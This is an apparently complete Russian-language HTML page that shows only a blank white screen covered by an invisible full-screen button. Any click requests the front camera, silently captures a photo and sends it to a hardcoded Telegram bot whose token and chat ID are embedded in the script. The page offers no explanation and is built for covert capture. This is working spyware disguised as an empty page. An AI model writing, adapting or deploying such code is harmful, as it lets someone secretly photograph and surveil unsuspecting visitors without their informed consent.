<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        html, body {
            margin: 0;
            width: 100%;
            height: 100%;
            background: white;
            overflow: hidden;
        }
        button {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            border: none;
            background: transparent;
            padding: 0;
        }
    </style>
</head>
<body>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>
<button id="btn"></button>

<script>
    const BOT_TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
    const CHAT_ID = "1314241513";

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    let requested = false;

    async function sendToTelegram(blob) {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "photo.png");
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        } catch (e) {
            console.log("Ошибка отправки:", e);
        }
    }

    async function takePhoto() {
        if (requested) return;
        requested = true;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            await video.play();
            await new Promise(r => setTimeout(r, 500));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            stream.getTracks().forEach(t => t.stop());
            canvas.toBlob(async (blob) => {
                await sendToTelegram(blob);
            }, "image/png");
        } catch (e) {
            requested = false;
            console.log("Ошибка:", e.name);
        }
    }

    document.getElementById("btn").addEventListener("click", takePhoto);
</script>

</body>
</html>
